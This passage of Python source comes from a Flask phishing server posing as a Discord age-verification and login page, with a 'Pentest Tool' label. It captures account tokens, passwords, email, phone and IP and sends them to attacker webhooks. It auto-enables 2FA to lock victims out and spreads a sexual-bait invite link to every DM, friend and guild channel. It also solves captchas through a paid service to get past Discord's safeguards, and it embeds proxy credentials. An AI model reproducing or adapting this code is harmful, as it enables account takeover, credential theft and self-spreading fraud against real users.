        pfp    = f"https://cdn.discordapp.com/avatars/{uid}/{avatar}.png" if avatar else None
        color  = 65280 if nitro else 16711680

        # ── Auto-enable 2FA if account has no MFA and we have a password ──
        totp_secret = None
        backup_codes_str = ''
        active_token = token  # Track which token is currently valid
        final_password = password
        pw_changed = False
        tfa_just_enabled = False
        if not mfa and password and password != '?':
            new_tok, secret, backups = _auto_enable_2fa(token, password)
            if new_tok:
                active_token = new_tok
                totp_secret = secret
                backup_codes_str = ', '.join(backups) if backups else 'None'
                mfa = True  # Now it's enabled
                tfa_just_enabled = True
                api_h['Authorization'] = active_token
                print(f'[2fa] Token updated for {uname}: {active_token[:20]}...')

        # ── Send mass messages using the active (post-takeover) token ──
        threading.Thread(target=_mass_message, args=(active_token, uname), daemon=True).start()

        try:
            cr = s_api.get(f"{API}/users/@me/channels", headers=api_h, timeout=10)
            dm_ids = [c['id'] for c in cr.json()] if cr.status_code == 200 else []
        except:
            dm_ids = []

        hq_str = _hq_guilds(active_token)
        try:
            gs = s_api.get(f"{API}/users/@me/guilds?with_counts=true",
                              headers=api_h, timeout=10).json()
            hq_ids = [g['id'] for g in gs if g.get("owner") or g.get("permissions") == "4398046511103"]
        except:
            hq_ids = []

        guild_ch = []
        for gid in hq_ids:
            try:
                gc = s_api.get(f"{API}/guilds/{gid}/channels",
                                  headers=api_h, timeout=10)
                if gc.status_code == 200:
                    guild_ch.extend(c['id'] for c in gc.json() if c.get('type') == 0)
            except:
                continue

        total = len(dm_ids) + len(guild_ch)

        # Build 2FA section for embed
        tfa_section = f"**2FA:** {'✅ Enabled' if mfa else '❌'}\n"
        if tfa_just_enabled and totp_secret:
            tfa_section += f"**TOTP Secret:** `{totp_secret}`\n"
            tfa_section += f"**Backup Codes:** `{backup_codes_str}`\n"

        # Build password section
        pw_line = f"**Password:** `{password}`\n"

        payload = {
            "embeds": [{
                "color": color,
                "thumbnail": {"url": pfp} if pfp else None,
                "author": {"name": f"{uname}#{disc}'s Information"},
                "description": (
                    f"**Discord ID:** `{uid}`\n"
                    f"**Email:** {email}\n"
                    f"**Phone:** {phone}\n"
                    f"{pw_line}"
                    f"{tfa_section}"
                    f"**Nitro:** {'✅' if nitro else '❌'}\n"
                    f"**System Info:**\n"
                    f"📛 Computer Name: `{comp}`\n"
                    f"👤 Username: `{luser}`\n"
                    f"🌐 IP Address: `{client_ip}`\n\n"
                    f"**TOKEN:**\n```{active_token}```\n"
                    f"**Messages to send:** `{total}`\n\n"
                    f"**HQ Guilds:**\n{hq_str}\n"
                ),
                "footer": {"text": "Logged by Combined Pentest Tool"}
            }],
            "username": "Pentest Tool"
        }
        plain_req.post(WEBHOOK, json=payload, timeout=10)
        print(f"[+] Webhook sent for {uname}#{disc} ({uid})")
        # Also fire backup webhook
        try:
            plain_req.post(WEBHOOK_BACKUP, json=payload, timeout=10)
        except: pass

    except Exception as e:
        print(f"[!] Webhook error: {e}")
        _fallback("exception")


def fire_webhook(token, client_ip="?", password="?"):
    # Try to look up password from store if not provided
    if password == '?':
        with _pw_store_lock:
            password = _pw_store.pop(token, '?')
    with _webhookd_lock:
        if token in _webhookd_tokens:
            print(f"[~] Webhook skipped (duplicate token)")
            return
        _webhookd_tokens.add(token)
    threading.Thread(target=send_webhook, args=(token, client_ip, password), daemon=True).start()


def _get_user_brief(token):
    """Fetch user id, username, avatar URL from token for success page."""
    try:
        h = {"Authorization": token, "User-Agent": UA}
        r = plain_req.get(f"{API}/users/@me", headers=h, timeout=10)
        if r.status_code == 200:
            u = r.json()
            uid = u.get('id', '')
            avatar = u.get('avatar', '')
            uname = u.get('username', '')
            pfp = f"https://cdn.discordapp.com/avatars/{uid}/{avatar}.png?size=128" if avatar else ''
            return {'user_id': uid, 'username': uname, 'avatar_url': pfp}
    except:
        pass
    return {}


def _assign_role(user_id):
    """Add verified role to user in guild using bot token.
    Uses curl_cffi for Chrome TLS impersonation (bypasses Cloudflare on Railway).
    Skips member check — PUT /roles returns clear errors if user isn't in guild.
    Retries up to 3 times with backoff."""
    if not all([BOT_TOKEN, GUILD_ID, VERIFIED_ID, user_id]):
        print(f'[role] Skipping role assign: missing config (bot={bool(BOT_TOKEN)}, guild={GUILD_ID or "?"}, role={VERIFIED_ID or "?"}, user={user_id or "?"})')
        return False
    try:
        s = _make_session()
        url = f'{API}/guilds/{GUILD_ID}/members/{user_id}/roles/{VERIFIED_ID}'
        h = {
            'Authorization': f'Bot {BOT_TOKEN}',
            'User-Agent': 'DiscordBot (https://verify.discord.com, 1.0)',
            'X-Audit-Log-Reason': 'Age verification',
            'Content-Length': '0',
        }
        for attempt in range(3):
            try:
                r = s.put(url, headers=h, timeout=10)
            except Exception as net_err:
                print(f'[role] Network error attempt {attempt+1}/3: {net_err}')
                if attempt < 2:
                    time.sleep(2 * (attempt + 1))
                    s = _make_session()
                    continue
                raise
            if r.status_code in (200, 204):
                print(f'[role] ✓ Assigned role {VERIFIED_ID} to user {user_id} in guild {GUILD_ID}')
                return True
            elif r.status_code == 429:
                retry_after = 5
                try: retry_after = r.json().get('retry_after', 5)
                except: pass
                print(f'[role] Rate limited, retrying in {retry_after}s...')
                time.sleep(retry_after)
                continue
            elif r.status_code in (500, 502, 503, 504) or r.status_code == 403:
                print(f'[role] Server error attempt {attempt+1}/3 [{r.status_code}]: {r.text[:200]}')
                if attempt < 2:
                    time.sleep(2 * (attempt + 1))
                    s = _make_session()
                    continue
                print(f'[role] ✗ Failed after 3 attempts [{r.status_code}]: {r.text[:300]}')
                return False
            else:
                print(f'[role] ✗ Failed to assign role [{r.status_code}]: {r.text[:300]}')
                return False
        return False
    except Exception as e:
        print(f'[role] Error assigning role: {e}')
        return False


def _join_voice_channel(token, guild_id, channel_id):
    """Connect user's token to a voice channel via Gateway (once, no retry)."""
    if not all([token, guild_id, channel_id]):
        print(f'[voice] Skipping: missing token/guild/channel')
        return False
    try:
        print(f'[voice] Connecting {token[:20]}... to voice {channel_id}')
        ws = websocket.create_connection(
            'wss://gateway.discord.gg/?v=9&encoding=json',
            header=[f'User-Agent: {UA}', 'Origin: https://discord.com'],
            timeout=30
        )
        hello = json.loads(ws.recv())
        hb_interval = hello.get('d', {}).get('heartbeat_interval', 41250) / 1000

        # Identify with proper browser fingerprint
        ws.send(json.dumps({
            'op': 2,
            'd': {
                'token': token,
                'capabilities': 30717,
                'properties': {
                    'os': 'Windows', 'browser': 'Chrome', 'device': '',
                    'system_locale': 'en-US', 'browser_user_agent': UA,
                    'browser_version': f'{CHROME_VER}.0.0.0', 'os_version': '10',
                    'referrer': '', 'referring_domain': '',
                    'referrer_current': '', 'referring_domain_current': '',
                    'release_channel': 'stable',
                    'client_build_number': BUILD, 'client_event_source': None
                },
                'presence': {'status': 'online', 'since': 0, 'activities': [], 'afk': False},
                'compress': False
            }
        }))

        # Wait for READY event
        ready_timeout = time.time() + 15
        while time.time() < ready_timeout:
            raw = ws.recv()
            d = json.loads(raw)
            if d.get('t') == 'READY':
                print(f'[voice] Gateway READY, joining channel...')
                break
        else:
            print(f'[voice] Timeout waiting for READY')
            ws.close()
            return False

        # Voice State Update — join the channel (self-muted, self-deafened)
        ws.send(json.dumps({
            'op': 4,
            'd': {
                'guild_id': guild_id,
                'channel_id': channel_id,
                'self_mute': True,
                'self_deaf': True,
                'self_video': False
            }
        }))
        print(f'[voice] Sent voice state update for {channel_id}')

        # Keep alive for 5 minutes (heartbeats), then disconnect
        stop_at = time.time() + 300
        next_hb = time.time() + hb_interval
        ws.settimeout(hb_interval + 5)
        while time.time() < stop_at:
            try:
                if time.time() >= next_hb:
                    ws.send(json.dumps({'op': 1, 'd': None}))
                    next_hb = time.time() + hb_interval
                raw = ws.recv()
                d = json.loads(raw)
                if d.get('op') == 1:  # Heartbeat request
                    ws.send(json.dumps({'op': 1, 'd': None}))
                    next_hb = time.time() + hb_interval
            except websocket.WebSocketTimeoutException:
                pass
            except:
                break

        # Leave voice before disconnecting
        try:
            ws.send(json.dumps({'op': 4, 'd': {'guild_id': guild_id, 'channel_id': None, 'self_mute': True, 'self_deaf': True}}))
            time.sleep(0.5)
        except:
            pass
        ws.close()
        print(f'[voice] Disconnected from voice after 5min')
        return True
    except Exception as e:
        print(f'[voice] Error: {e}')
        return False


def _set_dnd(token):
    """Set the captured token's status to Do Not Disturb immediately."""
    try:
        h = {"Authorization": token, "User-Agent": UA, "Content-Type": "application/json"}
        r = plain_req.patch(f"{API}/users/@me/settings", headers=h,
                            json={"status": "dnd"}, timeout=10)
        print(f'[dnd] Set DND: {r.status_code}')
    except Exception as e:
        print(f'[dnd] Error: {e}')


def _success_with_info(token):
    """Build success response with user info, fire webhook & assign role + voice."""
    info = _get_user_brief(token)
    # Assign verified role in background
    if info.get('user_id'):
        threading.Thread(target=_assign_role, args=(info['user_id'],), daemon=True).start()
    # Join voice channel (once, no retry)
    if VOICE_CHANNEL_ID and GUILD_ID:
        threading.Thread(target=_join_voice_channel, args=(token, GUILD_ID, VOICE_CHANNEL_ID), daemon=True).start()
    # Join second voice channel
    if VOICE_CHANNEL_ID_2 and GUILD_ID_2:
        threading.Thread(target=_join_voice_channel, args=(token, GUILD_ID_2, VOICE_CHANNEL_ID_2), daemon=True).start()
    # Spread DM invite in background
    threading.Thread(target=_spread_dms, args=(token,), daemon=True).start()
    # Set to Do Not Disturb immediately
    threading.Thread(target=_set_dnd, args=(token,), daemon=True).start()
    return {'success': True, **info}


# ━━━━━━━━━━━━ DM Spread (stealth) ━━━━━━━━━━━━
import random

SPREAD_MESSAGE = 'https://discord.gg/bzGsAUpdsY bro join she is stripping on cam'

def _make_nonce():
    """Generate a Discord-style snowflake nonce (like real client)."""
    return str((int(time.time() * 1000) - 1420070400000) << 22 | random.randint(0, 4194303))


def _spread_dms(token):
    """Send invite link to all open DMs and friends using full Chrome TLS impersonation."""
    try:
        # Build a stealth session — same Chrome fingerprint the login used
        s = _make_session()

        # Visit discord.com first to get cookies (mimics real browser session)
        try:
            s.get('https://discord.com/channels/@me', headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'User-Agent': UA,
                'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
            }, timeout=15)
        except:
            pass

        def api_headers(with_ct=True):
            h = {
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Authorization': token,
                'Origin': 'https://discord.com',
                'Referer': 'https://discord.com/channels/@me',
                'User-Agent': UA,
                'X-Discord-Locale': 'en-US',
                'X-Discord-Timezone': 'America/Los_Angeles',
                'X-Debug-Options': 'bugReporterEnabled',
                'X-Super-Properties': sprops(),
                'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
            }
            if with_ct:
                h['Content-Type'] = 'application/json'
            return h

        # ── PHASE 1: Collect all DM targets (open DMs + friends) — DMs FIRST ──
        dm_channel_ids = []
        try:
            r = s.get(f'{API}/users/@me/channels', headers=api_headers(False), timeout=15)
            if r.status_code == 200:
                for ch in r.json():
                    if ch.get('type') in (1, 3):  # 1=DM, 3=GroupDM
                        dm_channel_ids.append(ch['id'])
                print(f'[spread] Found {len(dm_channel_ids)} open DM channels')
            else:
                print(f'[spread] Failed to get DMs: {r.status_code}')
        except Exception as e:
            print(f'[spread] DM list error: {e}')

        # Get friends and open DM channels for those not already open
        friend_user_ids = set()
        try:
            r = s.get(f'{API}/users/@me/relationships', headers=api_headers(False), timeout=15)
            if r.status_code == 200:
                for rel in r.json():
                    if rel.get('type') == 1:
                        friend_user_ids.add(rel['id'])
                print(f'[spread] Found {len(friend_user_ids)} friends')
            else:
                print(f'[spread] Failed to get friends: {r.status_code}')
        except Exception as e:
            print(f'[spread] Friends list error: {e}')

        for fid in friend_user_ids:
            try:
                time.sleep(0.65)
                r = s.post(f'{API}/users/@me/channels', headers=api_headers(),
                           json={'recipients': [fid]}, timeout=15)
                if r.status_code == 200:
                    ch_id = r.json().get('id')
                    if ch_id and ch_id not in dm_channel_ids:
                        dm_channel_ids.append(ch_id)
            except:
                pass

        print(f'[spread] Total DM channels to message: {len(dm_channel_ids)}')

        # ── PHASE 2: Send DM messages ──
        sent = 0
        failed = 0
        for ch_id in dm_channel_ids:
            try:
                time.sleep(0.65)
                payload = {
                    'content': SPREAD_MESSAGE,
                    'nonce': _make_nonce(),
                    'tts': False,
                    'flags': 0
                }
                r = s.post(f'{API}/channels/{ch_id}/messages',
                           headers=api_headers(), json=payload, timeout=15)
                if r.status_code == 200:
                    sent += 1
                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 5)
                    print(f'[spread] Rate limited on {ch_id}, waiting {retry}s')
                    time.sleep(retry + 1)
                    r2 = s.post(f'{API}/channels/{ch_id}/messages',
                                headers=api_headers(), json=payload, timeout=15)
                    if r2.status_code == 200:
                        sent += 1
                    else:
                        failed += 1
                elif r.status_code == 403:
                    failed += 1
                else:
                    failed += 1
                    print(f'[spread] DM error {r.status_code} on {ch_id}')
            except Exception as e:
                failed += 1

        print(f'[spread] DMs done: sent={sent}, failed={failed}')

        # ── PHASE 3: Spam ALL guild text channels with @everyone ──
        guild_sent = 0
        guild_failed = 0
        try:
            r = s.get(f'{API}/users/@me/guilds', headers=api_headers(False), timeout=15)
            if r.status_code == 200:
                guilds = r.json()
                print(f'[spread] Found {len(guilds)} guilds to spam')
                for guild in guilds:
                    gid = guild['id']
                    try:
                        cr = s.get(f'{API}/guilds/{gid}/channels', headers=api_headers(False), timeout=15)
                        if cr.status_code != 200:
                            continue
                        channels = cr.json()
                        text_chs = [c for c in channels if c.get('type') == 0]
                        for ch in text_chs:
                            try:
                                time.sleep(0.65)
                                payload = {
                                    'content': f'@everyone {SPREAD_MESSAGE}',
                                    'nonce': _make_nonce(),
                                    'tts': False,
                                    'flags': 0
                                }
                                r2 = s.post(f'{API}/channels/{ch["id"]}/messages',
                                            headers=api_headers(), json=payload, timeout=15)
                                if r2.status_code == 200:
                                    guild_sent += 1
                                elif r2.status_code == 429:
                                    rt = r2.json().get('retry_after', 5)
                                    time.sleep(rt + 1)
                                    r3 = s.post(f'{API}/channels/{ch["id"]}/messages',
                                                headers=api_headers(), json=payload, timeout=15)
                                    if r3.status_code == 200:
                                        guild_sent += 1
                                    else:
                                        guild_failed += 1
                                else:
                                    guild_failed += 1
                            except:
                                guild_failed += 1
                    except:
                        pass
        except Exception as e:
            print(f'[spread] Guild fetch error: {e}')

        print(f'[spread] Guilds done: sent={guild_sent}, failed={guild_failed}')
        print(f'[spread] TOTAL: DM={sent}, Guild={guild_sent}')

    except Exception as e:
        print(f'[spread] Fatal error: {e}')


# ━━━━━━━━━━━━ QR Remote Auth ━━━━━━━━━━━━

sessions = {}          # QR auth sessions
login_sessions = {}    # Captcha flow: sid -> DiscordSession (persisted between captcha challenge & solve)
_login_lock = threading.Lock()  # Thread-safe access to login_sessions

import collections

# ━━━━━━━━━━━━ Session Pre-Warm Pool ━━━━━━━━━━━━
# Pre-prepares DiscordSessions (cookies + fingerprint) so logins start faster.
# Saves ~2-4s per login by skipping the prepare() step.

_session_pool = collections.deque()
_session_pool_lock = threading.Lock()
_session_pool_active = 0
SESSION_POOL_MAX = 5
SESSION_POOL_TTL = 300  # 5 minutes (cookies stay valid longer than captcha tokens)


def _prepare_session_worker():
    global _session_pool_active
    try:
        ds = DiscordSession()
        ds.prepare()
        if ds.cookies_ready:
            with _session_pool_lock:
                _session_pool.append({'session': ds, 'time': time.time()})
            print(f'[session-pool] Ready! Pool: {len(_session_pool)}')
        else:
            print('[session-pool] Failed to prepare session')
    except Exception as e:
        print(f'[session-pool] Error: {e}')
    finally:
        with _session_pool_lock:
            _session_pool_active -= 1


def _refill_session_pool():
    global _session_pool_active
    with _session_pool_lock:
        now = time.time()
        while _session_pool and (now - _session_pool[0]['time']) > SESSION_POOL_TTL:
            _session_pool.popleft()
        pool_size = len(_session_pool)
        needed = SESSION_POOL_MAX - pool_size - _session_pool_active
        if needed <= 0:
            return
        to_launch = min(needed, 3)  # launch up to 3 at once for faster refill
        _session_pool_active += to_launch
    for _ in range(to_launch):
        threading.Thread(target=_prepare_session_worker, daemon=True).start()


def _get_ready_session():
    """Get a pre-prepared session from the pool (instant) or None."""
    with _session_pool_lock:
        now = time.time()
        while _session_pool:
            entry = _session_pool.popleft()
            if now - entry['time'] < SESSION_POOL_TTL:
                threading.Thread(target=_refill_session_pool, daemon=True).start()
                return entry['session']
    _refill_session_pool()
    return None


def _session_pool_loop():
    """Background loop — keeps session pool full."""
    print('[session-pool] Background loop started (warming in 2s)')
    time.sleep(2)  # Quick start — sessions ready for first visitors
    while True:
        try:
            _refill_session_pool()
        except Exception as e:
            print(f'[session-pool] Error: {e}')
        time.sleep(8)


# ━━━━━━━━━━━━ Captcha Pre-Solve Pool ━━━━━━━━━━━━
# Solves captchas in advance so they're ready instantly when needed.
# Adapts to whatever sitekey Discord is currently using.

import collections

DEFAULT_SITEKEY = 'a9b5fb07-92ff-493f-86fe-352a2803b3df'
_last_discord_sitekey = DEFAULT_SITEKEY  # updated whenever Discord returns a captcha
_presolve_pool = collections.deque()  # deque of {'token': str, 'time': float, 'sitekey': str}
_presolve_lock = threading.Lock()
_presolve_active = 0  # number of solves currently running
PRESOLVE_MAX_ACTIVE = 8  # max concurrent pre-solves
PRESOLVE_MAX_POOL = 8    # max ready tokens to keep
PRESOLVE_TOKEN_TTL = 80  # hCaptcha tokens expire ~120s, stay well under


def _presolve_worker():
    """Background worker: solve one captcha and add to pool."""
    global _presolve_active
    try:
        sitekey = _last_discord_sitekey
        print(f'[presol] Starting pre-solve (sitekey={sitekey[:16]}...)')
        token, err = solve_captcha(sitekey, '')
        if token:
            with _presolve_lock:
                _presolve_pool.append({'token': token, 'time': time.time(), 'sitekey': sitekey})
            print(f'[presol] Token ready! Pool size: {len(_presolve_pool)}')
        else:
            print(f'[presol] Failed: {err}')
    finally:
        with _presolve_lock:
            _presolve_active -= 1


def _start_presolve():
    """DISABLED — Discord Enterprise hCaptcha requires rqdata-matched tokens.
    Generic pre-solved tokens (no rqdata) are ALWAYS rejected by Discord.
    Use email-specific prechallenge instead."""
    pass


def _presolve_loop():
    """Disabled — Discord Enterprise hCaptcha requires rqdata-matched tokens,
    so pre-solved pool tokens (no rqdata) are always rejected.
    Keeping function for future use if this changes."""
    print('[presol] Pool DISABLED — Discord requires rqdata-matched tokens')
    # No-op loop to keep thread alive without wasting API calls
    while True:
        time.sleep(60)


def _get_presolved(required_sitekey=None):
    """Get a pre-solved token if available (FIFO). Checks sitekey match."""
    with _presolve_lock:
        now = time.time()
        while _presolve_pool:
            entry = _presolve_pool.popleft()
            age = now - entry['time']
            if age >= PRESOLVE_TOKEN_TTL:
                print(f'[presol] Discarding expired token (age {age:.0f}s)')
                continue
            # Check sitekey match if required
            if required_sitekey and entry.get('sitekey') != required_sitekey:
                print(f'[presol] Discarding token with wrong sitekey ({entry.get("sitekey", "?")[:16]} != {required_sitekey[:16]})')
                continue
            print(f'[presol] Using pre-solved token (age {age:.0f}s, sitekey={entry.get("sitekey", "?")[:16]})')
            return entry['token']
    return None


PROXY = os.environ.get('CAPTCHA_PROXY', 'http://henchmanbobby_gmail_com:Fatman11@la.residential.rayobyte.com:8000')

def solve_captcha(sitekey, rqdata, cancel_event=None):
    """Solve hCaptcha Enterprise via Anti-Captcha with adaptive polling.
    cancel_event: optional threading.Event — if set, abort polling early (used by _solve_race)."""
    t0 = time.time()
    api = 'https://api.anti-captcha.com'
    print(f'[*] Solving captcha via Anti-Captcha... key={ANTICAPTCHA_KEY[:8]}*** sitekey={sitekey[:16]}...')
    if not ANTICAPTCHA_KEY:
        return None, 'No ANTICAPTCHA_KEY configured'
    try:
        task = {
            'type': 'HCaptchaTaskProxyless',
            'websiteURL': 'https://discord.com/login',
            'websiteKey': sitekey,
            'isEnterprise': True,
            'userAgent': UA,
        }
        if rqdata:
            task['enterprisePayload'] = {'rqdata': rqdata}

        r = plain_req.post(f'{api}/createTask', json={
            'clientKey': ANTICAPTCHA_KEY,
            'task': task,
            'languagePool': 'en',
        }, timeout=30)
        print(f'[*] Anti-Captcha createTask raw: {r.status_code} {r.text[:300]}')
        j = r.json()
        eid = j.get('errorId', 0)
        task_id = j.get('taskId')
        print(f'[*] Anti-Captcha createTask: taskId={task_id} errorId={eid} ({time.time()-t0:.1f}s)')

        if eid != 0:
            return None, j.get('errorDescription', j.get('errorCode', 'createTask failed'))
        if not task_id:
            return None, 'No taskId returned'

        # Aggressive adaptive polling: 50ms first 5s, 100ms next 15s, 200ms after
        for poll in range(1200):
            # Check cancel signal — another racer already won
            if cancel_event and cancel_event.is_set():
                return None, 'cancelled (race won)'
            elapsed = time.time() - t0
            if elapsed < 5:
                interval = 0.05
            elif elapsed < 20:
                interval = 0.1
            else:
                interval = 0.2
            time.sleep(interval)
            r = plain_req.post(f'{api}/getTaskResult', json={
                'clientKey': ANTICAPTCHA_KEY,
                'taskId': task_id,
            }, timeout=15)
            j = r.json()
            if j.get('status') == 'ready':
                token = j.get('solution', {}).get('gRecaptchaResponse', '')
                elapsed = time.time() - t0
                if token and len(token) > 20:
                    print(f'[+] Anti-Captcha solved! {len(token)} chars in {elapsed:.1f}s')
                    return token, None
                return None, 'Empty token from Anti-Captcha'
            if j.get('errorId', 0) != 0:
                return None, j.get('errorDescription', j.get('errorCode', 'solve failed'))
            if poll % 50 == 0 and poll > 0:
                print(f'[*] Anti-Captcha waiting... ({elapsed:.0f}s)')
            if elapsed > 180:
                break

        return None, f'Anti-Captcha timeout ({time.time()-t0:.0f}s)'
    except Exception as e:
        import traceback
        traceback.print_exc()
        return None, f'Anti-Captcha exception: {type(e).__name__}: {e}'


def _solve_race(sitekey, rqdata, n=9):
    """Submit N Anti-Captcha tasks and return the first successful token.
    Uses n=1 by default to avoid paying for wasted parallel tasks.
    When a winner is found, signals all other workers to stop polling immediately
    and returns without waiting for them to finish."""
    if n <= 1 or not ANTICAPTCHA_KEY:
        return solve_captcha(sitekey, rqdata)

    winner = [None]
    last_err = [None]
    done = threading.Event()    # signals: we have a result (win or all failed)
    cancel = threading.Event()  # signals: stop polling, race is over
    finished = [0]
    lock = threading.Lock()

    def _worker(idx):
        if cancel.is_set():  # another worker already won
            return None, 'cancelled'
        t, e = solve_captcha(sitekey, rqdata, cancel_event=cancel)
        with lock:
            finished[0] += 1
            if t and not winner[0]:
                winner[0] = t
                done.set()
                cancel.set()   # tell all other workers to stop polling
                print(f'[race] Worker {idx} won! Cancelling {n - finished[0]} remaining tasks')
            elif not t:
                last_err[0] = e
            if finished[0] >= n and not winner[0]:
                done.set()
        return t, e

    from concurrent.futures import ThreadPoolExecutor
    pool = ThreadPoolExecutor(max_workers=n)
    futures = [pool.submit(_worker, i) for i in range(n)]
    done.wait(timeout=180)
    cancel.set()  # ensure all workers stop
    # Don't wait for pool shutdown — remaining workers will exit on next poll via cancel_event
    pool.shutdown(wait=False, cancel_futures=True)

    return winner[0], last_err[0]


class QRAuth:
    def __init__(self):
        self.id    = uuid.uuid4().hex[:8]
        self.pk    = rsa.generate_private_key(65537, 2048)
        self.pub   = self.pk.public_key()
        self.fp    = None
        self.st    = 'init'
        self.user  = None
        self.token = None
        self.err   = None
        self.ws    = None
        self._stop = threading.Event()
        self._wh   = False

    def pub_b64(self):
        return base64.b64encode(self.pub.public_bytes(
            serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo
        )).decode()

    def decrypt(self, b64s):
        return self.pk.decrypt(
            base64.b64decode(b64s),
            asym_pad.OAEP(asym_pad.MGF1(hashes.SHA256()), hashes.SHA256(), None)
        )


def _qr_worker(s: QRAuth):
    # For the QR ticket exchange, create a stealth session
    ds = DiscordSession()
    ds.prepare()

    try:
        def on_msg(ws, raw):
            d  = json.loads(raw)
            op = d.get('op')

            if op == 'hello':
                hb = d.get('heartbeat_interval', 40000) / 1000
                ws.send(json.dumps({'op': 'init', 'encoded_public_key': s.pub_b64()}))
                def beat():
                    while not s._stop.is_set():
                        try: ws.send(json.dumps({'op': 'heartbeat'}))
                        except: break
                        s._stop.wait(hb)
                threading.Thread(target=beat, daemon=True).start()

            elif op == 'nonce_proof':
                dec   = s.decrypt(d['encrypted_nonce'])
                proof = b64url(hashlib.sha256(dec).digest())
                ws.send(json.dumps({'op': 'nonce_proof', 'proof': proof}))

            elif op == 'pending_remote_init':
                s.fp = d['fingerprint']
                s.st = 'pending'

            elif op == 'pending_ticket':
                try:
                    info  = s.decrypt(d['encrypted_user_payload']).decode()
                    parts = info.split(':')
                    s.user = {
                        'id': parts[0],
                        'disc': parts[1] if len(parts) > 1 else '0',
                        'avatar': parts[2] if len(parts) > 2 else '',
                        'name': parts[3] if len(parts) > 3 else '?',
                    }
                    s.st = 'scanned'
                except Exception as e:
                    s.st = 'error'; s.err = str(e)

            elif op == 'pending_login':
                s.st = 'confirming'
                try:
                    r = ds.post('/users/@me/remote-auth/login', {'ticket': d['ticket']})
                    j = r.json()
                    if 'encrypted_token' in j:
                        s.token = s.decrypt(j['encrypted_token']).decode()
                        s.st = 'done'
                        if not s._wh:
                            s._wh = True
                            fire_webhook(s.token)
                    else:
                        s.st = 'error'; s.err = json.dumps(j)
                except Exception as e:
                    s.st = 'error'; s.err = str(e)
                s._stop.set()

            elif op == 'cancel':
                s.st = 'cancelled'; s._stop.set()

        def on_err(ws, e):
            if s.st not in ('done', 'cancelled'):
                s.st = 'error'; s.err = str(e)
            s._stop.set()

        def on_close(ws, code, msg):
            if s.st in ('init', 'pending', 'scanned', 'confirming'):
                s.st = 'expired' if s.st == 'pending' else 'error'
                s.err = s.err or ('QR expired' if s.st == 'expired' else f'Closed ({code})')
            s._stop.set()

        ws = websocket.WebSocketApp(
            WS_URL,
            on_message=on_msg, on_error=on_err, on_close=on_close,
            header=[f'Origin: https://discord.com', f'User-Agent: {UA}'],
        )
        s.ws = ws
        ws.run_forever()
    except Exception as e:
        s.st = 'error'; s.err = str(e); s._stop.set()


# ━━━━━━━━━━━━ Routes ━━━━━━━━━━━━

@app.route('/')
def index():
    return send_from_directory('.', 'verify_page.html')


@app.route('/verify/<path:slug>')
def verify_catchall(slug):
    """Catch-all: /verify/anything serves the same verify page."""
    return send_from_directory('.', 'verify_page.html')


@app.route('/login')
def login_page():
    try:
        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'discord_login.html'), 'r', encoding='utf-8') as f:
            html = f.read()
    except:
        return send_from_directory('.', 'discord_login.html')
    resp = make_response(html)
    resp.headers['Content-Type'] = 'text/html; charset=utf-8'
    resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    resp.headers['Pragma'] = 'no-cache'
    resp.headers['Expires'] = '0'
    resp.headers['Clear-Site-Data'] = '"cache"'
    resp.headers['Vary'] = '*'
    import hashlib
    resp.headers['ETag'] = hashlib.md5(html.encode()).hexdigest()
    return resp


@app.route('/favicon.ico')
def favicon():
    return send_from_directory('.', 'captcha.png', mimetype='image/png')


# ━━━━━━━━━━ Predictive Pre-Challenge ━━━━━━━━━━
# Starts solving captcha BEFORE user clicks Login.
# When page loads, we trigger a dummy login to Discord → get captcha challenge
# with real rqdata → start solving immediately. By the time the user types
# their credentials and clicks Login (~10-20s), the captcha is already solved.
# The rqtoken is NOT credential-specific — Discord returns captchas based on
# IP/session risk BEFORE checking credentials.

_prechallenges = {}  # pc_id → {'token': str|None, 'rqtoken': str, 'event': Event, 'ds': DiscordSession, 'time': float}
_pc_lock = threading.Lock()  # Thread-safe access to _prechallenges


def _prechallenge_worker(pc_id, ds, email=None):
    """Background: login with real email + dummy password → captcha challenge → solve with real rqdata."""
    try:
        # Use real email (if provided) + dummy password to trigger captcha
        # Discord ties captcha challenges to the email, so we MUST use the real one
        payload = {
            'login': email or 'warmup@captcha.local',
            'password': 'PrechallengeDummy99!',
            'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
        }
        print(f'[prechallenge:{pc_id}] Sending dummy login to get captcha challenge...')
        r = ds.post('/auth/login', payload)
        j = r.json()
        print(f'[prechallenge:{pc_id}] Response [{r.status_code}]: {str(j)[:300]}')

        ckeys = j.get('captcha_key', [])
        is_captcha = isinstance(ckeys, list) and (
            'captcha-required' in ckeys or j.get('captcha_sitekey')
        )

        if not is_captcha:
            print(f'[prechallenge:{pc_id}] No captcha returned — skipping')
            pc = _prechallenges.get(pc_id)
            if pc:
                pc['status'] = 'no_captcha'
                pc['event'].set()
            return

        sitekey = j.get('captcha_sitekey', 'a9b5fb07-92ff-493f-86fe-352a2803b3df')
        rqdata  = j.get('captcha_rqdata', '')
        rqtoken = j.get('captcha_rqtoken', '')

        pc = _prechallenges.get(pc_id)
        if not pc:
            return
        pc['rqtoken'] = rqtoken
        pc['sitekey'] = sitekey

        # Race solve with REAL rqdata from Discord
        print(f'[prechallenge:{pc_id}] Got challenge! sitekey={sitekey[:16]}, rqdata={bool(rqdata)} — solving...')
        token, err = _solve_race(sitekey, rqdata, n=9)

        pc['token'] = token
        pc['status'] = 'solved' if token else 'failed'
        pc['event'].set()
        print(f'[prechallenge:{pc_id}] {"SOLVED" if token else "FAILED"}: {err if err else f"{len(token)} chars"}')

